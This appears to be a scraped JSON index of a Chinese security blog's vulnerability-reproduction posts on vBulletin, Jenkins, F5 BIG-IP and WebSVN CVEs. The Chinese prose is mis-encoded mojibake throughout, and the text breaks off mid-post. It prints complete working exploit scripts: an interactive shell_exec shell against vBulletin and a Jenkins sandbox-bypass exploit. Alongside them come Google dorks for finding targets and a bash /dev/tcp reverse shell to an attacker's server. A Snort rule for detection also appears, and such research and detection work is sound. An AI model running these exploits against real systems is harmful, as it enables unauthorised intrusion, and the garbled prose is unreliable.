å¯†æŠ¥æ–‡çš„è§£å¯†ã€‚ æ–¹æ³•ä¸€ æ–¹æ³•äºŒ 1234567mkdir ~/tls &amp;&amp; touch ~/tls/sslkeylog.log#zshecho &quot;\\nexport SSLKEYLOGFILE=~/tls/sslkeylog.log&quot; &gt;&gt; ~/.zshrc &amp;&amp; source ~/.zshrc#bashecho &quot;\\nexport SSLKEYLOGFILE=~/tls/sslkeylog.log&quot; &gt;&gt; ~/.bash_profile &amp;&amp; . ~/.bash_profile è®©Wiresharkè¯»å–å¯†é’¥æ–‡ä»¶ åœ¨ Wireshark çš„ SSL é…ç½®é¢æ¿çš„ ã€Œ(Pre)-Master-Secret log filenameã€é€‰é¡¹ä¸­è¿™ä¸ªæ–‡ä»¶é€‰ä¸Šï¼ˆç¼–è¾‘-&gt;&#x3D;é¦–é€‰é¡¹-&gt;åè®®ï¼‰ã€‚å¦‚ä¸‹å›¾ æ³¨æ„ï¼Œè¿™æ˜¯è€ç‰ˆæœ¬çš„wiresharkï¼Œå¦‚æœå‘ç°æ²¡æœ‰SSLé€‰é¡¹ï¼Œåˆ™é€‰æ‹©TLSï¼Œæ–°ç‰ˆæœ¬çš„æ˜¯TLSï¼›ä½†æ˜¯é…ç½®æ˜¯ä¸€æ ·çš„ï¼› ã€ŒSSL debug fileã€ä¹Ÿå»ºè®®é…ä¸Šï¼Œè¿™æ ·è§£å¯†è¿‡ç¨‹ä¸­çš„æ—¥å¿—éƒ½ä¼šè®°å½•ä¸‹æ¥ï¼Œä¾¿äºè°ƒè¯•ã€‚ æ–°ç‰ˆ Wireshark åœ¨é…ç½®äº† TLS åŠ å¯†åï¼Œä¼šè‡ªåŠ¨è¯†åˆ«å¹¶è§£æ HTTPS æµé‡ã€‚è®¿é—®æƒ³è¦æŠ“åŒ…çš„ HTTPS ç½‘ç«™ï¼Œæ ¹æ® IP å’Œåè®®è¿‡æ»¤ä¸€ä¸‹ï¼Œå°±å¯ä»¥è½»æ¾çœ‹åˆ°æƒ³è¦çš„ HTTPS æ•°æ®åŒ…äº†ã€‚ é…ç½®å¥½å¯†é’¥ä¹‹åï¼Œé‡æ–°æŠ“å–ã€‚ è§£å¯†æˆåŠŸfollow http å‚è€ƒæ–‡ç« https://github.com/MzzdToT/CVE-2019-12725 https://www.csdn.net/tags/MtTaMg1sMzE3MzU3LWJsb2cO0O0O.html","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"ZeroShell","slug":"ZeroShell","permalink":"https://gryffinbit.top/tags/ZeroShell/"}],"author":"Gryffinbit"},{"title":"vBulletin 5.x RCEï¼ˆCVE-2019-16759ï¼‰å¤ç°åŠæµé‡åˆ†æ","slug":"vBulletin-5-x-RCEï¼ˆCVE-2019-16759ï¼‰å¤ç°åŠæµé‡åˆ†æ","date":"2022-11-15T14:52:28.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/11/15/vBulletin-5-x-RCEï¼ˆCVE-2019-16759ï¼‰å¤ç°åŠæµé‡åˆ†æ/","permalink":"https://gryffinbit.top/2022/11/15/vBulletin-5-x-RCE%EF%BC%88CVE-2019-16759%EF%BC%89%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"","text":"æ¼æ´åŸç†å‰è¨€ vBulletinæ˜¯ä¸€ä¸ªæ”¶è´¹ä½å»‰ä½†å¼ºå¤§çš„å»ºç«™BBS(è®ºå›)CMSï¼ˆå†…å®¹ç®¡ç†ç³»ç»Ÿï¼Œæ˜¯ä¸€ç§ä½äºwebå‰ç«¯å’Œåç«¯ä¹‹é—´çš„è½¯ä»¶ç³»ç»Ÿã€‚å‘å¸ƒäººå‘˜ä½¿ç”¨å†…å®¹ç®¡ç†ç³»ç»Ÿæäº¤ã€ä¿®æ”¹ã€å‘å¸ƒå†…å®¹ç­‰ï¼‰ï¼Œè¯¥CMSå›½å¤–å¤§é‡è®ºå›ä½¿ç”¨ï¼Œä¸­å›½å›½å†…å°‘è®¸ç½‘ç«™ä½¿ç”¨ã€‚è¿‘æ—¥ï¼ŒvBulletin 5.xçˆ†å‡ºä¸€ä¸ªå‰å°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´,æ— éœ€ç™»å½•å³å¯è§¦å‘ã€‚è¯¥è®ºå›ç¨‹åºåœ¨å›½å¤–çš„å›½å¤–çš„ç”¨æˆ·é‡å°±ç±»ä¼¼dzè®ºå›åœ¨å›½å†…çš„ç”¨æˆ·é‡ã€‚ æ¦‚è¿° æ¼æ´é€šè¿‡è¯·æ±‚ajax/render/widget_phpè¿›è¡Œæ¨¡æ¿æ³¨å…¥è§¦å‘ä»£ç æ‰§è¡Œã€‚ å½±å“èŒƒå›´ 5.0.0 &lt;&#x3D; vBulletin &lt;&#x3D;5.5.4 æ¼æ´ä¿®å¤ å»ºè®®å¯¹includes\\vb5\\frontend\\controller\\bbcode.phpä¸­çš„å˜é‡evalCodeåšè¿‡æ»¤é˜²æŠ¤ ç¯å¢ƒæ­å»ºvBulletionæœ‰åœ¨çº¿æµ‹è¯•ç‰ˆæœ¬ 1https://www.vbulletin.com/en/vb5-trial/ æˆ–è€…docker å¤ç° 123456789101112131415docker run -ti -p 80:8080 --name vbulletin -d p8361/vbulletin-cve-2015-7808docker exec -it &lt;id&gt; /bin/bash# updateç„¶åè£…vimapt-get update# æ”¹é…ç½®vi /etc/apache2/apache2.conf# æœ€ä¸‹é¢è¡¥è¿™ä¸ªé…ç½®ServerName localhost:80# ç»™æ ¹ç›®å½•ä¸‹run.shæƒé™å¹¶å¯åŠ¨chmod +x ./run.sh./run.sh å¤ç°exp è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´çš„è§¦å‘ç‚¹æ˜¯æœªç»è¿‡éªŒè¯çš„ç”¨æˆ·é€šè¿‡å‘index.phpå‘é€routestringå‚æ•°ï¼Œå½“routestingå‚æ•°æ˜¯ajax/render/widget_phpï¼Œé€šè¿‡widgetConfig[code]æ‰§è¡Œè¿œç¨‹ä»£ç ï¼Œæ ¼å¼ä¸ºecho shell_exec(&#39;&quot;+cmd+&quot;&#39;); exit; python2 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/usr/bin/python## vBulletin 5.x 0day pre-auth RCE exploit## This should work on all versions from 5.0.0 till 5.5.4## Google Dorks:# - site:*.vbulletin.net# - &quot;Powered by vBulletin Version 5.5.4&quot;import requestsimport sysif len(sys.argv) != 2: sys.exit(&quot;Usage: %s &lt;URL to vBulletin&gt;&quot; % sys.argv[0])params = &#123;&quot;routestring&quot;:&quot;ajax/render/widget_php&quot;&#125;while True: try: cmd = raw_input(&quot;vBulletin$ &quot;) params[&quot;widgetConfig[code]&quot;] = &quot;echo shell_exec(&#x27;&quot;+cmd+&quot;&#x27;); exit;&quot; r = requests.post(url = sys.argv[1], data = params) if r.status_code == 200: print r.text else: sys.exit(&quot;Exploit failed! :(&quot;) except KeyboardInterrupt: sys.exit(&quot; Closing shell...&quot;) except Exception, e: sys.exit(str(e)) python3 ç”¨burpæŠ“åŒ… 123456789101112131415161718192021222324252627# -*-coding:utf-8 -*-import requestsimport sysif len(sys.argv) != 2: sys.exit(&quot;Usage: %s &lt;URL to vBulletin&gt;&quot; % sys.argv[0])proxies =&#123; &quot;http&quot;:&quot;http://127.0.0.1:8080/&quot;&#125;params = &#123;&quot;routestring&quot;:&quot;ajax/render/widget_php&quot;&#125;while True: try: cmd = input(&quot;&gt;&gt;&gt;Shell= &quot;) params[&quot;widgetConfig[code]&quot;] = &quot;echo shell_exec(&#x27;&quot;+cmd+&quot;&#x27;); exit;&quot; r = requests.post(url = sys.argv[1], data = params, proxies=proxies) if r.status_code == 200: print(r.text) else: sys.exit(&quot;Exploit failed! :(&quot;) except KeyboardInterrupt: sys.exit(&quot;\\nClosing shell...&quot;) except Exception as e: sys.exit(str(e)) ç‰¹å¾æµé‡ å‚è€ƒæ–‡ç« https://xz.aliyun.com/t/6495","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[],"author":"Gryffinbit"},{"title":"jenkinsè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ç‰¹å¾åˆ†æåŠè§„åˆ™æå–ï¼ˆCVE-2018-1000861ï¼‰","slug":"jenkinsè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-1000861ï¼‰","date":"2022-11-09T10:29:06.000Z","updated":"2024-11-12T06:59:35.000Z","comments":true,"path":"2022/11/09/jenkinsè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-1000861ï¼‰/","permalink":"https://gryffinbit.top/2022/11/09/jenkins%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1000861%EF%BC%89/","excerpt":"","text":"ç®€ä»‹Jenkinsæ˜¯å¼€æºè½¯ä»¶é¡¹ç›®ï¼ŒåŸºäºJavaå¼€å‘çš„æŒç»­é›†æˆå·¥å…·ï¼Œç”¨äºç›‘æ§æŒç»­é‡å¤çš„å·¥ä½œï¼Œæ—¨åœ¨æä¾›ä¸€ä¸ªå¼€æ”¾æ˜“ç”¨çš„è½¯ä»¶å¹³å°ï¼Œä½¿è½¯ä»¶çš„æŒç»­é›†æˆå˜æˆå¯èƒ½ã€‚ Jenkinsä½¿ç”¨Stapleræ¡†æ¶å¼€å‘ï¼Œå…¶å…è®¸ç”¨æˆ·é€šè¿‡URL PATHæ¥è°ƒç”¨ä¸€æ¬¡publicæ–¹æ³•ã€‚ç”±äºè¿™ä¸ªè¿‡ç¨‹æ²¡æœ‰åšé™åˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ä¸€äº›ç‰¹æ®Šçš„PATHæ¥æ‰§è¡Œä¸€äº›æ•æ„Ÿçš„Javaæ–¹æ³•ã€‚ é€šè¿‡è¿™ä¸ªæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å¾ˆå¤šå¯ä¾›åˆ©ç”¨çš„åˆ©ç”¨é“¾ã€‚å…¶ä¸­æœ€ä¸¥é‡çš„å°±æ˜¯ç»•è¿‡Groovyæ²™ç›’å¯¼è‡´æœªæˆæƒç”¨æˆ·å¯æ‰§è¡Œä»»æ„å‘½ä»¤ï¼šJenkinsåœ¨æ²™ç›’ä¸­æ‰§è¡ŒGroovyå‰ä¼šå…ˆæ£€æŸ¥è„šæœ¬æ˜¯å¦æœ‰é”™è¯¯ï¼Œæ£€æŸ¥æ“ä½œæ˜¯æ²¡æœ‰æ²™ç›’çš„ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡Meta-Programmingçš„æ–¹å¼ï¼Œåœ¨æ£€æŸ¥è¿™ä¸ªæ­¥éª¤æ—¶æ‰§è¡Œä»»æ„å‘½ä»¤ vulhubé¶åœºå¤ç°è…¾è®¯äº‘æœåŠ¡å™¨ 12docker-compose builddocker-compose up -d è®¿é—®é¶åœºhttp://your-ip:8080 æ¼æ´å¤ç° - POC1234567http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public class x &#123; public x()&#123; &quot;touch /tmp/success&quot;.execute() &#125;&#125; Urlç¼–ç  1public class x &#123;public x()&#123;&quot;touch /tmp/success&quot;.execute()&#125;&#125; 1/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%20class%20x%20%7Bpublic%20x()%7B%22touch%20%2Ftmp%2Fsuccess%22.execute()%7D%7D æœåŠ¡å™¨éªŒè¯ï¼ŒæˆåŠŸç”Ÿæˆsuccessæ–‡ä»¶ æ¼æ´å¤ç° - EXP.pyä½¿ç”¨æ–¹æ³•ï¼š 12Usage: python exp.py &lt;url&gt; &lt;cmd&gt; é¶åœºç«¯éªŒè¯ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#!/usr/bin/python# coding: UTF-8# author: Orange Tsai(@orange_8361)# import sysimport requestsfrom enum import Enum# remove bad SSL warningstry: requests.packages.urllib3.disable_warnings()except: passendpoint = &#x27;descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript&#x27;class mode(Enum): ACL_PATCHED = 0 NOT_JENKINS = 1 READ_ENABLE = 2 READ_BYPASS = 3 ENTRY_NOTFOUND = 999def usage(): print &#x27;&#x27;&#x27; Usage: python exp.py &lt;url&gt; &lt;cmd&gt; &#x27;&#x27;&#x27;def _log(msg, fail=False): nb = &#x27;[*]&#x27; if fail: nb = &#x27;[-]&#x27; print &#x27;%s %s&#x27; % (nb, msg)def _get(url, params=None): r = requests.get(url, verify=False, params=params) return r.status_code, r.contentdef _add_bypass(url): return url + &#x27;securityRealm/user/admin/&#x27;def check(url): flag, accessible = mode.ACL_PATCHED, False # check ANONYMOUS_READ status, content = _get(url) if status == 200 and &#x27;adjuncts&#x27; in content: flag, accessible = mode.READ_ENABLE, True _log(&#x27;ANONYMOUS_READ enable!&#x27;) elif status == 403: _log(&#x27;ANONYMOUS_READ disable!&#x27;) # check ACL bypass, CVE-2018-1000861 status, content = _get(_add_bypass(url)) if status == 200 and &#x27;adjuncts&#x27; in content: flag, accessible = mode.READ_BYPASS, True else: flag = mode.NOT_JENKINS # check entry point, CVE-2019-1003005 if accessible: if flag is mode.READ_BYPASS: url = _add_bypass(url) status, content = _get(url + endpoint) if status == 404: flag = mode.ENTRY_NOTFOUND return flagdef exploit(url, cmd): payload = &#x27;public class x&#123;public x()&#123;new String(&quot;%s&quot;.decodeHex()).execute()&#125;&#125;&#x27; % cmd.encode(&#x27;hex&#x27;) params = &#123; &#x27;sandbox&#x27;: True, &#x27;value&#x27;: payload &#125; status, content = _get(url + endpoint, params) if status == 200: _log(&#x27;Exploit success!(it should be :P)&#x27;) elif status == 405: _log(&#x27;It seems Jenkins has patched the RCE gadget :(&#x27;) else: _log(&#x27;Exploit fail with HTTP status [%d]&#x27; % status, fail=True) if &#x27;stack trace&#x27; in content: for _ in content.splitlines(): if _.startswith(&#x27;Caused:&#x27;): _log(_, fail=True)if __name__ == &#x27;__main__&#x27;: if len(sys.argv) != 3: usage() exit() url = sys.argv[1].rstrip(&#x27;/&#x27;) + &#x27;/&#x27; cmd = sys.argv[2] flag = check(url) if flag is mode.ACL_PATCHED: _log(&#x27;It seems Jenkins is up-to-date(&gt;2.137) :(&#x27;, fail=True) elif flag is mode.NOT_JENKINS: _log(&#x27;Is this Jenkins?&#x27;, fail=True) elif flag is mode.READ_ENABLE: exploit(url, cmd) elif flag is mode.READ_BYPASS: _log(&#x27;Bypass with CVE-2018-1000861!&#x27;) exploit(_add_bypass(url), cmd) else: _log(&#x27;The `checkScript` is not found, please try other entries(see refs)&#x27;, fail=True) åå¼¹shellvps ipå’Œç«¯å£ 1bash -i &gt;&amp; /dev/tcp/x.x.x.x/7777 0&gt;&amp;1 baseç¼–ç  urlç¼–ç  pocéªŒè¯ 1http://IP:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%20class%20x%20&#123;public%20x()&#123;%22å‘½ä»¤æ›¿æ¢%22.execute()&#125;&#125; vpså¼€å¯ç›‘å¬ 1nc -lvnp 7777 æŠ“åŒ…éªŒè¯é€šè¿‡EXPï¼Œè¿›è¡Œç‰¹å¾æµé‡åˆ†æ 1securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript 1descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript è§„åˆ™æå–ï¼ˆåªæä¾›æå–æ€è·¯ï¼‰ é™¤äº†æœ€åä¸€ä¸ªåœ°æ–¹å¯ä»¥ä¸åŠ ï¼Œå…¶ä»–çš„å­—æ®µåˆ†å·åé¢éƒ½è¦åŠ ç©ºæ ¼ 1alert tcp $EXTERNAL_NET any -&gt; $HOME_NET $HTTP_PORTS (msg:&quot;jenkins remote code execution(CVE-2018-1000861)&quot;; content:&quot;securityRealm/user/admin&quot;; fast_pattern:only; http_uri; reference:cve,2018-1000861;reference:url,https://access.redhat.com/security/cve/CVE-2018-1000861; classtype:attempted-admin; sid:1002523;rev:1;) 1234# ä½¿ç”¨-A fastå‚æ•°ï¼Œåœ¨alertå‘Šè­¦ä¸­ï¼Œå¯ä»¥æŸ¥çœ‹åˆ°å‘Šè­¦å†…å®¹å’Œsidsnort -c /etc/snort/snort.conf -r jenkins.pcap -A fast -l /var/log/snort/# æŸ¥çœ‹å‘Šè­¦æ—¥å¿—cat /var/log/snort/alert é™„ä»¶æµé‡åŒ…ä»¥åŠexp é“¾æ¥: https://pan.baidu.com/s/1fibahYkUQBkBiY9yc6s2hg","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[],"author":"Gryffinbit"},{"title":"å¤ç° BIG-IP iControl REST æ¼æ´ï¼ˆCVE-2022-1388ï¼‰","slug":"å¤ç° BIG-IP iControl REST æ¼æ´ï¼ˆCVE-2022-1388ï¼‰","date":"2022-10-31T14:19:00.000Z","updated":"2024-11-12T07:00:17.000Z","comments":true,"path":"2022/10/31/å¤ç° BIG-IP iControl REST æ¼æ´ï¼ˆCVE-2022-1388ï¼‰/","permalink":"https://gryffinbit.top/2022/10/31/%E5%A4%8D%E7%8E%B0%20BIG-IP%20iControl%20REST%20%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1388%EF%BC%89/","excerpt":"","text":"æ¼æ´è¯¦æƒ…æ¼æ´ç®€ä»‹ F5å®˜ç½‘å‘å¸ƒå®‰å…¨å…¬å‘Šï¼ŒæŠ«éœ²F5 BIG-IPå­˜åœ¨ä¸€å¤„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2022-1388ï¼‰ã€‚æ¼æ´å­˜åœ¨äºiControl RESTç»„ä»¶ä¸­ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥å‘é€è¯·æ±‚ç»•è¿‡BIG-IPä¸­çš„iControl RESTè®¤è¯ï¼Œè¿›è€Œå¯¼è‡´å¯ä»¥åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€åˆ›å»ºæˆ–åˆ é™¤æ–‡ä»¶æˆ–ç¦ç”¨BIG-IPä¸Šçš„æœåŠ¡ã€‚ F5æ˜¯è´Ÿè½½å‡è¡¡çš„è€å‰è¾ˆï¼Œä¸€ç›´ä»¥æ¥éƒ½ä»¥åŠŸèƒ½å¼ºå¤§ï¼Œæ€§èƒ½ç¨³å®šè‘—ç§°ï¼Œå¾ˆå¤šåŠŸèƒ½å…¶å®æ˜¯è½¯è´Ÿè½½æ— æ³•åšåˆ°çš„ã€‚ F5 BIG-IPç”¨ä½œHTTPè´Ÿè½½å‡è¡¡å™¨çš„ä¸»è¦åŠŸèƒ½ï¼š 1ã€F5 BIG-IPæä¾›12ç§çµæ´»çš„ç®—æ³•å°†æ‰€æœ‰æµé‡å‡è¡¡çš„åˆ†é…åˆ°å„ä¸ªæœåŠ¡å™¨ï¼Œè€Œé¢å¯¹ç”¨æˆ·ï¼Œåªæ˜¯ä¸€å°è™šæ‹ŸæœåŠ¡å™¨ã€‚ 2ã€F5 BIG-IPå¯ä»¥ç¡®è®¤åº”ç”¨ç¨‹åºèƒ½å¦å¯¹è¯·æ±‚è¿”å›å¯¹åº”çš„æ•°æ®ã€‚å‡å¦‚F5 BIG-IPåé¢çš„æŸä¸€å°æœåŠ¡å™¨å‘ç”ŸæœåŠ¡åœæ­¢ã€æ­»æœºç­‰æ•…éšœï¼ŒF5ä¼šæ£€æŸ¥å‡ºæ¥å¹¶å°†è¯¥æœåŠ¡å™¨æ ‡è¯†ä¸ºå®•æœºï¼Œä»è€Œä¸å°†ç”¨æˆ·çš„è®¿é—®è¯·æ±‚ä¼ é€åˆ°è¯¥å°å‘ç”Ÿæ•…éšœçš„æœåŠ¡å™¨ä¸Šã€‚è¿™æ ·ï¼Œåªè¦å…¶å®ƒçš„æœåŠ¡å™¨æ­£å¸¸ï¼Œç”¨æˆ·çš„è®¿é—®å°±ä¸ä¼šå—åˆ°å½±å“ã€‚å®•æœºä¸€æ—¦ä¿®å¤ï¼ŒF5 BIG-IPå°±ä¼šè‡ªåŠ¨æŸ¥è¯åº”ç”¨ä¿è¯å¯¹å®¢æˆ·çš„è¯·æ±‚ä½œå‡ºæ­£ç¡®å“åº”å¹¶æ¢å¤å‘è¯¥æœåŠ¡å™¨ä¼ é€ã€‚ 3ã€F5 BIG-IPå…·æœ‰åŠ¨æ€Sessionçš„ä¼šè¯ä¿æŒåŠŸèƒ½ï¼Œç¬”è€…ä¹Ÿæ˜¯åœ¨ç½‘ç«™ä¸­ä½¿ç”¨çš„F5å°†ç”¨æˆ·IPä¸Sessioné€šè¿‡F5è¿›è¡Œçš„ç»‘å®šï¼Œä½¿å…¶Sessionä¿æŒä¸€è‡´ã€‚ 4ã€F5 BIG-IPçš„iRulesåŠŸèƒ½å¯ä»¥åšHTTPå†…å®¹è¿‡æ»¤ï¼Œæ ¹æ®ä¸åŒçš„åŸŸåã€URLï¼Œå°†è®¿é—®è¯·æ±‚ä¼ é€åˆ°ä¸åŒçš„æœåŠ¡å™¨ã€‚ æ¼æ´åˆ©ç”¨æ¡ä»¶ è¯¥æ¼æ´æ˜¯ç”±äºiControl RESTç»„ä»¶çš„èº«ä»½éªŒè¯åŠŸèƒ½å­˜åœ¨ç¼ºé™·ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ¶æ„æ”»å‡»è€…ï¼Œå¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„æ¶æ„è¯·æ±‚å‘é€è‡³BIG-IPæœåŠ¡å™¨ï¼Œä»è€Œèƒ½å¤Ÿç»•è¿‡èº«ä»½éªŒè¯ï¼Œåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€åˆ›å»ºæˆ–åˆ é™¤æ–‡ä»¶ã€ç¦ç”¨æœåŠ¡ç­‰ã€‚ æ¼æ´å½±å“èŒƒå›´ ç¯å¢ƒé…ç½®ä¸»æœºç³»ç»Ÿï¼šMacBook Pro Big Sur å¤ç°ä»å®˜ç½‘https://downloads.f5.com/esd/productlines.jspä¸‹è½½è™šæ‹Ÿé•œåƒï¼Œæœ¬åœ°å¤ç°ï¼š é€‰æ‹©é•œåƒéœ€è¦åœ¨å—å½±å“ç‰ˆæœ¬å†…çš„è™šæ‹ŸæœºovaåŒ… å¯¼å…¥å®Œæˆåæ‰“å¼€è¯¥è™šæ‹Ÿæœºï¼Œéœ€è¦è·å–è¯¥è™šæ‹Ÿæœºçš„ipï¼Œç»ˆç«¯è¾“å…¥ç”¨æˆ·åroot å¯†ç  defaultç™»å½•åè¾“å…¥ifconfig mgmtå³å¯æŸ¥çœ‹ipï¼ˆadmin&#x2F;admin ä¹Ÿå¯ä»¥ç™»é™†ï¼‰ ï¼ˆå¯†ç Fuckyou123ï¼‰ ç„¶ååœ¨æµè§ˆå™¨è¾“å…¥https://&lt;ip&gt;æ‰“å¼€çœ‹åˆ°ç™»å½•ç•Œé¢æŠ“åŒ…å³å¯ æµé‡æ˜¯httpsåŠ å¯†çš„ã€‚ ä¼ä¸šä¸­æœ‰è´Ÿè½½å‡è¡¡ï¼Œä¼šæŠŠhttpsè§£å¯†æˆhttpï¼Œåœ¨è¿›è¡Œæ£€æµ‹ å‚è€ƒæ–‡ç« https://forum.butian.net/share/1567","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[],"author":"Gryffinbit"},{"title":"å¤ç°WebSVN 2.6.0 æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥æ¼æ´ (CVE-2021-32305)","slug":"å¤ç°WebSVN-2-6-0-æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥æ¼æ´-CVE-2021-32305","date":"2022-10-31T14:18:36.000Z","updated":"2024-11-12T07:00:17.000Z","comments":true,"path":"2022/10/31/å¤ç°WebSVN-2-6-0-æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥æ¼æ´-CVE-2021-32305/","permalink":"https://gryffinbit.top/2022/10/31/%E5%A4%8D%E7%8E%B0WebSVN-2-6-0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-32305/","excerpt":"","text":"æ¼æ´æè¿°æ¼æ´è¯¦æƒ… WebSVNæ˜¯ä¸€ä¸ªåŸºäºWebçš„Subversion Repositoryæµè§ˆå™¨ï¼Œå¯ä»¥æŸ¥çœ‹æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„æ—¥å¿—ï¼ŒæŸ¥çœ‹æ–‡ä»¶çš„å˜åŒ–åˆ—è¡¨ç­‰ã€‚å…¶search.php?search= å‚æ•°ä¸‹è¿‡æ»¤ä¸ä¸¥è°¨å¯¼è‡´RCEã€‚ WebSVNå®˜ç½‘åœ°å€ï¼šhttps://websvnphp.github.io/ æ¼æ´æºç ï¼šhttps://github.com/websvnphp/websvn/releases/tag/2.6.0 æ¼æ´å½±å“WebSVN 2.6.1ä¹‹å‰ æ¼æ´åˆ†æubuntuä¸Šå®‰è£…apache 123456789apt-get updateapt-get install nginx# é˜²ç«å¢™æœªå¼€å¯# å¯åŠ¨webæœåŠ¡å™¨ï¼ŒæŸ¥çœ‹çŠ¶æ€ï¼Œæ˜¯å¦å¼€å¯systemctl status nginx# æµè§ˆå™¨è®¿é—® è¦åœæ­¢WebæœåŠ¡å™¨ï¼Œè¾“å…¥ï¼š 1sudo systemctl stop nginx è¦åœ¨åœæ­¢æ—¶ï¼Œå¯åŠ¨WebæœåŠ¡å™¨ï¼Œé”®å…¥ï¼š 1sudo systemctl start nginx è¦åœæ­¢ï¼Œç„¶åå†æ¬¡å¯åŠ¨è¯¥æœåŠ¡ï¼Œé”®å…¥ï¼š 1sudo systemctl restart nginx å¦‚æœæˆ‘ä»¬åªæ˜¯ä¿®æ”¹é…ç½®ï¼ŒNginx å¯ä»¥åœ¨ä¸ç»ˆç«¯çš„æƒ…å†µä¸‹çƒ­åŠ è½½ã€‚æˆ‘ä»¬å¯ä»¥é”®å…¥ï¼š 1sudo systemctl reload nginx é»˜è®¤æƒ…å†µä¸‹ï¼ŒNginx ä¼šåœ¨æœåŠ¡å™¨å¯åŠ¨æ—¶ï¼Œè·Ÿéšç³»ç»Ÿå¯åŠ¨ï¼Œå¦‚æœæˆ‘ä»¬ä¸æƒ³è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªå‘½ä»¤æ¥ç¦æ­¢ï¼š 1sudo systemctl disable nginx è¦é‡æ–°è®©ç³»ç»Ÿå¯åŠ¨æ—¶å¼•å¯¼ Nginx å¯åŠ¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¾“å…¥ï¼š 1sudo systemctl enable nginx è®¿é—®nginxé¡µé¢ apacheä¸nginxæ˜¯å…±ç”¨åŒä¸€ä¸ªç«™ç‚¹ç›®å½•çš„ï¼Œå³åœ¨apacheå’Œnginxä¸­éƒ¨ç½²çš„ç½‘é¡µæ–‡ä»¶éƒ½æ”¾åœ¨åŒä¸€ä¸ªç›®å½•ä¸‹â€”&#x2F;var&#x2F;www&#x2F;html.å› æ­¤è®¿é—®nginxçš„ç«¯å£æ—¶æœ¬åº”è¯¥è°ƒç”¨ç¬¬ä¸‰ä¸ªæ–‡ä»¶ä½œä¸ºæ¬¢è¿é¡µï¼Œå´è°ƒç”¨äº†apacheçš„æ¬¢è¿é¡µæ–‡ä»¶. ä¿®æ”¹nginxç«¯å£ï¼›w 1234vim /etc/nginx/sites-available/default# ç¬¬ä¸€è¡Œç™½å­—éƒ¨åˆ†å¯ä¿®æ”¹nginxçš„ç«¯å£å·# ç¬¬äºŒè¡Œç™½å­—ç”¨æ¥è®¾ç½®nginxè‡ªå·±çš„ç«™ç‚¹ç›®å½•# ç¬¬ä¸‰è¡Œç™½å­—æ˜¯æ ¹æ®æ‰€æ’åˆ—çš„é¡ºåºè°ƒç”¨ç«™ç‚¹ç›®å½•é‡Œçš„ç½‘é¡µæ–‡ä»¶ä½œä¸ºè‡ªå·±çš„æ¬¢è¿é¡µ(è§£å†³ä¸€å¼€å§‹çš„é—®é¢˜åªéœ€æŠŠindex.nginx-debian.htmlæ”¾åœ¨index.htmlå‰å°±è¡Œäº†) æ¼æ´éªŒè¯ç¯å¢ƒå®‰è£… ä¸‹è½½2.6.0çš„websvnåˆ°æœåŠ¡å™¨ 123cd 